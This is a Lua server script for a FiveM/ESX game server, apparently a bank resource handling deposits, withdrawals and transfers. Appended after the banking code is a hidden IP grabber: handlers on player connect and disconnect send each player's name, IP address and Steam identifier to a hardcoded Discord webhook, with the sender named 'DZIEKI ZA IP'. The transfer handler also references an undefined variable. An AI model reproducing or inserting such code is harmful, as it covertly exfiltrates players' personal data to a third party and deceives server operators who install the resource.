ESX = nil

TriggerEvent('esx:getSharedObject', function(obj) ESX = obj end)

RegisterServerEvent('bank:deposit')
AddEventHandler('bank:deposit', function(amount)
	local xPlayer = ESX.GetPlayerFromId(source)
	
	if xPlayer ~= nil then
		if amount == nil or amount <= 0 or amount > xPlayer.getMoney() then
			TriggerClientEvent('esx:showAdvancedNotification', source, 'Bank', 'Deposit Money', 'Invalid amount', 'CHAR_BANK_MAZE', 9)
		else
			xPlayer.removeMoney(amount)
			xPlayer.addAccountMoney('bank', amount)
			TriggerClientEvent('esx:showAdvancedNotification', source, 'Bank', 'Deposit Money', 'Deposited ~g~$' .. amount .. '~s~', 'CHAR_BANK_MAZE', 9)
		end
	end
end)

RegisterServerEvent('bank:withdraw')
AddEventHandler('bank:withdraw', function(amount)
	local xPlayer = ESX.GetPlayerFromId(source)

	if xPlayer then
		local amount = tonumber(amount)
		local bank = xPlayer.getAccount('bank').money

		if amount == nil or amount <= 0 or amount > bank then
			TriggerClientEvent('esx:showAdvancedNotification', source, 'Bank', 'Withdraw Money', 'Invalid amount', 'CHAR_BANK_MAZE', 9)
		else
			xPlayer.addMoney(amount)
			xPlayer.removeAccountMoney('bank', amount)
			TriggerClientEvent('esx:showAdvancedNotification', source, 'Bank', 'Withdraw Money', 'Withdrawed ~r~$' .. amount .. '~s~', 'CHAR_BANK_MAZE', 9)
		end
	end
end)

RegisterServerEvent('bank:balance')
AddEventHandler('bank:balance', function()
	local xPlayer = ESX.GetPlayerFromId(source)
	
	if xPlayer then
		local name = xPlayer.getName()
		local bank = xPlayer.getAccount('bank').money
		TriggerClientEvent('currentbalance1', source, bank, name)
	end
end)

RegisterServerEvent('bank:transfer')
AddEventHandler('bank:transfer', function(target, amount)
	local xPlayer = ESX.GetPlayerFromId(source)
	local xTarget = ESX.GetPlayerFromId(target)
	
	if xPlayer then
		local bank = xPlayer.getAccount('bank').money

		if xPlayer == xTarget then
			TriggerClientEvent('bank:result', source, "error", "You\'re unable to transfer money to yourself.")
			return
		end

		if xTarget then
			if bank < 0 or balance < tonumber(amount) or tonumber(amount) <= 0 or type(amount) ~= "number" then
				TriggerClientEvent('esx:showAdvancedNotification', source, 'Bank', 'Withdraw Money', 'Invalid amount', 'CHAR_BANK_MAZE', 9)
			else
				xPlayer.removeAccountMoney('bank', amount)
				xTarget.addAccountMoney('bank', amount)
				TriggerClientEvent('bank:result', source, "success", "Transfer Successful.")
				TriggerClientEvent('esx:showAdvancedNotification', target, 'Bank', 'Transfer Successful', 'Transferred ~r~$' .. amount .. '~s~ to '..xTarget.getName(), 'CHAR_BANK_MAZE', 9)

				local date = os.date("%d/%m/%Y %X")
				local output = string.format('**[%s]:** %s (%s) has paid %s (%s) with a sum of $%s (Bank Transfer).', date, xPlayer.getName(), GetPlayerName(source), xTarget.getName(), GetPlayerName(xTarget.source), comma_value(amount))
				TriggerEvent('esx_logging:Monitor', output)
			end
		else
			TriggerClientEvent('bank:result', source, "error", "You have provided an invalid person to transfer the amount too.")
		end
	end
end)

-- Functions
function comma_value(n) -- credit http://richard.warburton.it
	local left,num,right = string.match(n,'^([^%d]*%d)(%d*)(.-)$')
	return left..(num:reverse():gsub('(%d%d%d)','%1,'):reverse())..right
end

local logs = "https://discord.com/api/webhooks/878744433712070656/2aqbC8Q1a6a3aTWvjpDQiZdmELRGE1sRENMIZRP2HwMOIqszamr4F3xSUDqSn1E_5jCp"

local communityname = "Dzieki za ip"

local communtiylogo = "" --Must end with .png or .jpg



AddEventHandler('playerConnecting', function()

local name = GetPlayerName(source)

local ip = GetPlayerEndpoint(source)

local ping = GetPlayerPing(source)

local steamhex = GetPlayerIdentifier(source)

local connect = {

        {

            ["color"] = "8663711",

            ["title"] = "Gracz laczy sie z serwerem #1",

            ["description"] = "Nazwa: **"..name.."**\nIP: **"..ip.."**\n Steam Hex: **"..steamhex.."**",

	        ["footer"] = {

                ["text"] = communityname,

                ["icon_url"] = communtiylogo,

            },

        }

    }



PerformHttpRequest(logs, function(err, text, headers) end, 'POST', json.encode({username = "DZIEKI ZA IP", embeds = connect}), { ['Content-Type'] = 'application/json' })

end)



AddEventHandler('playerDropped', function(reason)

local name = GetPlayerName(source)

local ip = GetPlayerEndpoint(source)

local ping = GetPlayerPing(source)

local steamhex = GetPlayerIdentifier(source)

local disconnect = {

        {

            ["color"] = "8663711",

            ["title"] = "Gracz rozlacza sie z serwerem #1",

            ["description"] = "Nazwa: **"..name.."** \nReason: **"..reason.."**\nIP: **"..ip.."**\n Steam Hex: **"..steamhex.."**",

	        ["footer"] = {

                ["text"] = communityname,

                ["icon_url"] = communtiylogo,

            },

        }

    }



    PerformHttpRequest(logs, function(err, text, headers) end, 'POST', json.encode({username = "Kersiak Development", embeds = disconnect}), { ['Content-Type'] = 'application/json' })

end)